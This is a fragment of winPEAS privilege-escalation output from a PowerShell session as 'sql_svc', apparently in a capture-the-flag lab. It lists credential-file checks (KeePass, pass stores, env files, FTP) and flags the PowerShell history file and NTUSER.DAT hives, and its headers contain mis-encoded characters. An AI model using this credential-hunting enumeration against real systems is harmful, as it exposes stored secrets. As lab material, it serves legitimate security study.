����������͹ Analyzing Env Files (limit 70)

����������͹ Analyzing Msmtprc Files (limit 70)

����������͹ Analyzing InfluxDB Files (limit 70)

����������͹ Analyzing Zabbix Files (limit 70)

����������͹ Analyzing Github Files (limit 70)

����������͹ Analyzing Svn Files (limit 70)

����������͹ Analyzing Keepass Files (limit 70)

����������͹ Analyzing Pre-Shared Keys Files (limit 70)

����������͹ Analyzing Pass Store Directories Files (limit 70)

����������͹ Analyzing FTP Files (limit 70)

����������͹ Analyzing Bind Files (limit 70)

����������͹ Analyzing SeedDMS Files (limit 70)

����������͹ Analyzing Ddclient Files (limit 70)

����������͹ Analyzing Sentry Files (limit 70)

����������͹ Analyzing Strapi Files (limit 70)

����������͹ Analyzing Cacti Files (limit 70)

����������͹ Analyzing Roundcube Files (limit 70)

����������͹ Analyzing Passbolt Files (limit 70)

����������͹ Analyzing Jetty Files (limit 70)

����������͹ Analyzing Wget Files (limit 70)

����������͹ Analyzing Interesting logs Files (limit 70)

����������͹ Analyzing Other Interesting Files Files (limit 70)

����������͹ Analyzing Windows Files Files (limit 70)
    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\sql_svc\NTUSER.DAT

����������͹ Analyzing Other Windows Files Files (limit 70)

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |
       |---------------------------------------------------------------------------|
       |         Become a Patreon    :     https://www.patreon.com/peass           |
       |         Follow on Twitter   :     @carlospolopm                           |
       |         Respect on HTB      :     SirBroccoli & makikvues                 |
       |---------------------------------------------------------------------------|
       |                                 Thank you!                                |
       \---------------------------------------------------------------------------/

PS C:\Users\sql_svc\Downloads>


```